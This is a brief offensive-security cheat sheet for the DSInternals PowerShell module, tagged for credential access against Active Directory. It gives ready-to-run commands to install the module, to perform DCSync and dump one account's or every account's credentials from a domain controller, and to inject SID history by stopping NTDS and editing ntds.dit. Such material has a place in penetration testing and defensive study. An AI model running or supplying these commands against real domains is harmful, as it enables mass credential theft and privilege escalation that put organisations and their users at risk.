# DSInternals

% DSInternals, , Active directory
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## install manual
```powershell
Unblock-File <dsinternal>.zip
expand-archive <dsinternal>.zip -DestinationPath C:\Windows\system32\WindowsPowerShell\v1.0\Modules
```


## dcsync user
```powershell
Get-ADReplAccount -SamAccountName <user> -Server '<dc_name>'
```

## dcsync all
```powershell
Get-ADReplAccount -All -Server '<dc_name>'
```


## Modify SIDHisory
```powershell
Stop-service NTDS -force && Add-ADDBSidHistory -samaccountname <account> -sidhistory '<sid_1>','<sid_2>' -DBPath C:\Windows\ntds\ntds.dit -force && Start-service NTDS
```